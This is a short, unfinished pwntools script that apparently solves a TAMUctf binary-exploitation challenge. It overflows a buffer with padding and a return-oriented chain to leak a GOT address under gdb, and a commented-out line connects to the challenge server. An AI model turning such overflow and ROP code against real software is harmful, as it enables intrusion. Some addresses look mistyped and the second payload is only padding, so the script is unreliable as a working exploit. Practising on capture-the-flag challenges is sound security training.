from pwn import *

context.terminal = ['tmux','splitw' ,'-h']
binary = ELF("./pwnme")
libc = ELF("./libpwnme.so")
#env = {"LD_PRELOAD": "./libc.so.6"}

#p = remote("tamuctf.com", 443, ssl=True, sni="pwnme")

p = gdb.debug("./pwnme", gdbscript='''
set follow-fork-mode child
b *main
b *pwnme
b *pwnme+42
''')

p.recvline()

pad_A = b'A' * 24
pad_B = b'B' * 8
pad_C = b'C' * 72

pop_rdi = 0x40118b
pop_rsi_r15 = 0x401189c
mov_edi_rax = 0x401191
call_rax = 0x401010

libc_win = libc.symbols['win']

libc_test = 0x403ff0

pwnme_got = 0x404018
libc_start_main_leak = 0x403ff0
pwnme_plt = 0x4011a2
libc_puts_got = 0x7f2a2ad10030


# leak pwnme()
# calculate the difference: PIE base address & pwnme()

p.sendline(pad_A + p64(pop_rdi) + p64(pwnme_got) + p64(pwnme_plt))

p.recvline()
p.sendline(pad_A + b'B' * 32)
#p.sendline(pad_A + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(pwnme) + p64(ret))
#puts_leak = u64(p.recv(6).ljust(8, b'\x00'))

p.interactive()
